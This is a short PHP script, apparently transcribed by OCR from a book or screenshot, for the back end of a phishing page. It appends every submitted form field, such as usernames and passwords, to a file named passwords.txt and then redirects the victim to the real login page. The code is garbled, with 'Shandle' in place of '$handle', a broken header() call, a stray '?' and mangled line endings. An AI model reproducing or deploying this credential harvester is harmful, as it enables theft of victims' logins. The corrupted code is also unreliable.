<?php
header (Location: original login page');
Shandle = fopen("passwords.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite (Shandle, "=");
fwrite($handle, $value);
fwrite($handle, "Ar\n");
?
fwrite($handle, "Ir\n");
fclose (Shandle);
exit;
?>
